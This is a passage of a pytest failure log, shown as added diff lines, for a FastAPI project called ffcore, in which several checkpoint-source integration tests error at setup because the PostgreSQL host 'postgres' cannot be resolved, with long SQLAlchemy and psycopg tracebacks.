+ffcore/core/auth.py:269: in resolve_actor
+    actor = await resolver(request, settings)
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+ffcore/core/session.py:84: in session_resolver
+    user = await session.scalar(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/ext/asyncio/session.py:720: in scalar
+    return await greenlet_spawn(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:210: in greenlet_spawn
+    result = context.throw(*sys.exc_info())
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2534: in scalar
+    return self._execute_internal(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2350: in _execute_internal
+    conn = self._connection_for_bind(bind)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2173: in _connection_for_bind
+    return trans._connection_for_bind(engine, execution_options)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+<sqlalchemy generated _go() wrapper for sqlalchemy.orm.session.SessionTransaction._connection_for_bind>:2: in _connection_for_bind
+    return target(fn, self, bind, execution_options)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/state_changes.py:137: in _go
+    ret_value = fn(self, *arg, **kw)
+                ^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:1203: in _connection_for_bind
+    conn = bind.connect()
+           ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3275: in connect
+    return self._connection_cls(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:151: in __init__
+    Connection._handle_dbapi_exception_noconnection(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:2432: in _handle_dbapi_exception_noconnection
+    raise sqlalchemy_exception.with_traceback(exc_info[2]) from e
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:149: in __init__
+    self._dbapi_connection = engine.raw_connection()
+                             ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3299: in raw_connection
+    return self.pool.connect()
+           ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:445: in connect
+    return _ConnectionFairy._checkout(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:1324: in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:709: in checkout
+    rec = pool._do_get()
+          ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/impl.py:301: in _do_get
+    return self._create_connection()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:386: in _create_connection
+    return _ConnectionRecord(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:671: in __init__
+    self.__connect()
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:916: in __connect
+    with util.safe_reraise():
+         ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/langhelpers.py:166: in __exit__
+    raise exc_value.with_traceback(exc_tb)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:912: in __connect
+    self.dbapi_connection = connection = pool._invoke_creator(self)
+                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/create.py:645: in connect
+    return dialect.connect(*cargs_tup, **cparams)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/default.py:869: in connect
+    return self.loaded_dbapi.connect(*cargs, **cparams)  # type: ignore[no-any-return]  # NOQA: E501
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/dialects/postgresql/psycopg.py:760: in connect
+    return await_(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:167: in await_
+    return current.parent.switch(awaitable)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:205: in greenlet_spawn
+    value = await result
+            ^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:378: in create
+    cls._handle_exception_no_connection(dbapi, error)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:409: in _handle_exception_no_connection
+    raise error.with_traceback(exc_info[2])
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:376: in create
+    connection = await connection_awaitable
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/psycopg/connection_async.py:116: in connect
+    attempts = await conninfo_attempts_async(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'host': 'postgres', 'dbname': 'ffcore_test_810981bcb86c', 'user': 'ffcore', 'password': 'dummy-not-secret-postgres', ...}
+
+    async def conninfo_attempts_async(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := get_param(params, "target_session_attrs") == "prefer-standby":
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(await _resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           sqlalchemy.exc.OperationalError: (psycopg.OperationalError) failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+E           (Background on this error at: https://sqlalche.me/e/21/e3q8)
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts_async.py:53: OperationalError
+---------------------------- Captured stderr setup -----------------------------
+2026-11-05 01:51:11,853 INFO ffcore.access access method=POST path=/api/v1/auth/login status=200 ms=1741
+2026-11-05 01:51:11,922 ERROR ffcore.litellm_reconcile litellm_model_not_written model=pe32ab09b.chat-default code=egress_not_allowlisted
+2026-11-05 01:51:11,924 ERROR ffcore.litellm_reconcile litellm_model_not_written model=pe32ab09b.tooly code=egress_not_allowlisted
+2026-11-05 01:51:11,924 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=2
+2026-11-05 01:51:21,949 INFO ffcore.access access method=POST path=/api/v1/projects/533e6541-5a97-447d-a4d7-5b6d6d8e11c4/knowledge-bases status=500 ms=10086
+------------------------------ Captured log setup ------------------------------
+INFO     ffcore.access:logging.py:263 access method=POST path=/api/v1/auth/login status=200 ms=1741
+ERROR    ffcore.litellm_reconcile:litellm_reconcile.py:371 litellm_model_not_written model=pe32ab09b.chat-default code=egress_not_allowlisted
+ERROR    ffcore.litellm_reconcile:litellm_reconcile.py:371 litellm_model_not_written model=pe32ab09b.tooly code=egress_not_allowlisted
+INFO     ffcore.litellm_reconcile:litellm_reconcile.py:372 litellm_reconciled created=0 updated=0 deleted=0 problems=2
+INFO     ffcore.access:logging.py:263 access method=POST path=/api/v1/projects/533e6541-5a97-447d-a4d7-5b6d6d8e11c4/knowledge-bases status=500 ms=10086
+_ ERROR at setup of test_116_4_sweep_closes_waiting_user_run_with_deleted_source _
+
+database_url = 'postgresql+psycopg://ffcore:dummy-not-secret-postgres@postgres:5432/ffcore_test_810981bcb86c'
+
+    @pytest.fixture
+    def pg(database_url):
+        plain = make_url(database_url).set(drivername="postgresql")
+>       with psycopg.connect(plain.render_as_string(hide_password=False), autocommit=True) as conn:
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+tests/integration/conftest.py:100: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/psycopg/connection.py:100: in connect
+    attempts = conninfo_attempts(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'user': 'ffcore', 'password': 'dummy-not-secret-postgres', 'dbname': 'ffcore_test_810981bcb86c', 'host': 'postgres', ...}
+
+    def conninfo_attempts(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := (
+            get_param(params, "target_session_attrs") == "prefer-standby"
+        ):
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(_resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           psycopg.OperationalError: failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts.py:55: OperationalError
+_ ERROR at setup of test_116_5_sweep_purges_threads_of_runs_ended_outside_the_runner _
+
+database_url = 'postgresql+psycopg://ffcore:dummy-not-secret-postgres@postgres:5432/ffcore_test_810981bcb86c'
+
+    @pytest.fixture
+    def pg(database_url):
+        plain = make_url(database_url).set(drivername="postgresql")
+>       with psycopg.connect(plain.render_as_string(hide_password=False), autocommit=True) as conn:
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+tests/integration/conftest.py:100: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/psycopg/connection.py:100: in connect
+    attempts = conninfo_attempts(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'user': 'ffcore', 'password': 'dummy-not-secret-postgres', 'dbname': 'ffcore_test_810981bcb86c', 'host': 'postgres', ...}
+
+    def conninfo_attempts(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := (
+            get_param(params, "target_session_attrs") == "prefer-standby"
+        ):
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(_resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           psycopg.OperationalError: failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts.py:55: OperationalError
+________ ERROR at setup of test_116_6_resume_with_live_source_completes ________
+
+database_url = 'postgresql+psycopg://ffcore:dummy-not-secret-postgres@postgres:5432/ffcore_test_810981bcb86c'
+
+    @pytest.fixture
+    def pg(database_url):
+        plain = make_url(database_url).set(drivername="postgresql")
+>       with psycopg.connect(plain.render_as_string(hide_password=False), autocommit=True) as conn:
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+tests/integration/conftest.py:100: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/psycopg/connection.py:100: in connect
+    attempts = conninfo_attempts(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'user': 'ffcore', 'password': 'dummy-not-secret-postgres', 'dbname': 'ffcore_test_810981bcb86c', 'host': 'postgres', ...}
+
+    def conninfo_attempts(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := (
+            get_param(params, "target_session_attrs") == "prefer-standby"
+        ):
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(_resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           psycopg.OperationalError: failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts.py:55: OperationalError
+_________ ERROR at setup of test_116_12_sweep_isolates_a_failing_close _________
+
+self = <sqlalchemy.engine.base.Connection object at 0x7fec574f5790>
+engine = Engine(postgresql+psycopg://ffcore:***@postgres:5432/ffcore_test_810981bcb86c)
+connection = None, _has_events = None, _allow_revalidate = True
+_allow_autobegin = True
+
+    def __init__(
+        self,
+        engine: Engine,
+        connection: Optional[PoolProxiedConnection] = None,
+        _has_events: Optional[bool] = None,
+        _allow_revalidate: bool = True,
+        _allow_autobegin: bool = True,
+    ):
+        """Construct a new Connection."""
+        self.engine = engine
+        self.dialect = dialect = engine.dialect
+    
+        if connection is None:
+            try:
+>               self._dbapi_connection = engine.raw_connection()
+                                         ^^^^^^^^^^^^^^^^^^^^^^^
+
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:149: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3299: in raw_connection
+    return self.pool.connect()
+           ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:445: in connect
+    return _ConnectionFairy._checkout(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:1324: in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:709: in checkout
+    rec = pool._do_get()
+          ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/impl.py:301: in _do_get
+    return self._create_connection()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:386: in _create_connection
+    return _ConnectionRecord(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:671: in __init__
+    self.__connect()
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:916: in __connect
+    with util.safe_reraise():
+         ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/langhelpers.py:166: in __exit__
+    raise exc_value.with_traceback(exc_tb)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:912: in __connect
+    self.dbapi_connection = connection = pool._invoke_creator(self)
+                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/create.py:645: in connect
+    return dialect.connect(*cargs_tup, **cparams)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/default.py:869: in connect
+    return self.loaded_dbapi.connect(*cargs, **cparams)  # type: ignore[no-any-return]  # NOQA: E501
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/dialects/postgresql/psycopg.py:760: in connect
+    return await_(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:167: in await_
+    return current.parent.switch(awaitable)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:205: in greenlet_spawn
+    value = await result
+            ^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:378: in create
+    cls._handle_exception_no_connection(dbapi, error)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:409: in _handle_exception_no_connection
+    raise error.with_traceback(exc_info[2])
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:376: in create
+    connection = await connection_awaitable
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/psycopg/connection_async.py:116: in connect
+    attempts = await conninfo_attempts_async(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'host': 'postgres', 'dbname': 'ffcore_test_810981bcb86c', 'user': 'ffcore', 'password': 'dummy-not-secret-postgres', ...}
+
+    async def conninfo_attempts_async(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := get_param(params, "target_session_attrs") == "prefer-standby":
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(await _resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           psycopg.OperationalError: failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts_async.py:53: OperationalError
+
+The above exception was the direct cause of the following exception:
+
+app = <fastapi.applications.FastAPI object at 0x7fede537bfb0>
+app_settings = Settings(deploy_profile='llmaas', inference_backend='ollama', offline=False, database_url=SecretStr('**********'), ser...flush_s=60, retention_dry_run=True, retention_audit_drop_enabled=False, retention_batch=5000, alert_service_down_s=300)
+database_url = 'postgresql+psycopg://ffcore:dummy-not-secret-postgres@postgres:5432/ffcore_test_810981bcb86c'
+tmp_path = PosixPath('/tmp/pytest-of-root/pytest-0/test_116_12_sweep_isolates_a_f0')
+make_user = <function make_user.<locals>.make at 0x7fec6db81f80>
+make_project = <function make_project.<locals>.make at 0x7fec723e3380>
+client_factory = <function client_factory.<locals>.make at 0x7fec723e27a0>
+
+    @pytest.fixture
+    def world(app, app_settings, database_url, tmp_path, make_user, make_project, client_factory):
+        from ffcore.core.config import get_settings
+    
+        settings = app_settings.model_copy(
+            update={
+                "fake_embed": True,
+                "knowledge_storage_dir": str(tmp_path / "storage"),
+                "database_url": SecretStr(database_url),
+                "redis_url": SecretStr(os.environ["REDIS_URL"]),
+            }
+        )
+        app.dependency_overrides[get_settings] = lambda: settings
+        queue = FakeQueue()
+        app.dependency_overrides[queue_dependency] = lambda: queue
+        setup(database_url)
+        project = make_project()
+        _, admin = make_user(memberships={project: ("admin", "edit")})
+>       w = {"settings": settings, "queue": queue, "project": project, "admin": client_factory(admin)}
+                                                                                ^^^^^^^^^^^^^^^^^^^^^
+
+tests/integration/test_116_checkpoint_sources.py:75: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+tests/integration/conftest.py:203: in make
+    client.__enter__()
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:572: in __enter__
+    portal.call(self.wait_startup)
+/opt/venv/lib/python3.12/site-packages/anyio/from_thread.py:340: in call
+    return cast(T_Retval, self.start_task_soon(func, *args).result())
+                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/concurrent/futures/_base.py:456: in result
+    return self.__get_result()
+           ^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/concurrent/futures/_base.py:401: in __get_result
+    raise self._exception
+/opt/venv/lib/python3.12/site-packages/anyio/from_thread.py:265: in _call_func
+    retval = await retval_or_awaitable
+             ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:608: in wait_startup
+    await receive()
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:599: in receive
+    self.task.result()
+/usr/local/lib/python3.12/concurrent/futures/_base.py:449: in result
+    return self.__get_result()
+           ^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/concurrent/futures/_base.py:401: in __get_result
+    raise self._exception
+/opt/venv/lib/python3.12/site-packages/anyio/from_thread.py:265: in _call_func
+    retval = await retval_or_awaitable
+             ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:589: in lifespan
+    await self.app(scope, self.stream_receive.receive, self.stream_send.send)
+/opt/venv/lib/python3.12/site-packages/fastapi/applications.py:1181: in __call__
+    await lifespan(
+/opt/venv/lib/python3.12/site-packages/fastapi/telemetry/_runtime.py:238: in lifespan
+    await app(scope, wrapped_receive, wrapped_send)
+/opt/venv/lib/python3.12/site-packages/starlette/applications.py:96: in __call__
+    await self.middleware_stack(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/middleware/errors.py:151: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/telemetry/_asgi.py:151: in __call__
+    await self.app(scope, receive, send)
+ffcore/core/logging.py:250: in __call__
+    await self.app(scope, receive, send)
+ffcore/api/upload_limit.py:44: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/middleware/exceptions.py:49: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/middleware/asyncexitstack.py:18: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/routing.py:683: in __call__
+    await self.middleware_stack(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:2798: in app
+    await self.lifespan(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/routing.py:661: in lifespan
+    async with self.lifespan_context(app) as maybe_state:
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:248: in merged_lifespan
+    async with original_context(app) as maybe_original_state:
+               ^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:248: in merged_lifespan
+    async with original_context(app) as maybe_original_state:
+               ^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:248: in merged_lifespan
+    async with original_context(app) as maybe_original_state:
+               ^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:248: in merged_lifespan
+    async with original_context(app) as maybe_original_state:
+               ^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:248: in merged_lifespan
+    async with original_context(app) as maybe_original_state:
+               ^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:210: in __aenter__
+    return await anext(self.gen)
+           ^^^^^^^^^^^^^^^^^^^^^
+ffcore/main.py:54: in lifespan
+    await ensure_audit_partitions(2)
+ffcore/core/audit.py:336: in ensure_audit_partitions
+    result = await session.execute(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/ext/asyncio/session.py:651: in execute
+    result = await greenlet_spawn(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:210: in greenlet_spawn
+    result = context.throw(*sys.exc_info())
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2473: in execute
+    return self._execute_internal(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2350: in _execute_internal
+    conn = self._connection_for_bind(bind)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:2173: in _connection_for_bind
+    return trans._connection_for_bind(engine, execution_options)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+<sqlalchemy generated _go() wrapper for sqlalchemy.orm.session.SessionTransaction._connection_for_bind>:2: in _connection_for_bind
+    return target(fn, self, bind, execution_options)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/state_changes.py:137: in _go
+    ret_value = fn(self, *arg, **kw)
+                ^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/orm/session.py:1203: in _connection_for_bind
+    conn = bind.connect()
+           ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3275: in connect
+    return self._connection_cls(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:151: in __init__
+    Connection._handle_dbapi_exception_noconnection(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:2432: in _handle_dbapi_exception_noconnection
+    raise sqlalchemy_exception.with_traceback(exc_info[2]) from e
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:149: in __init__
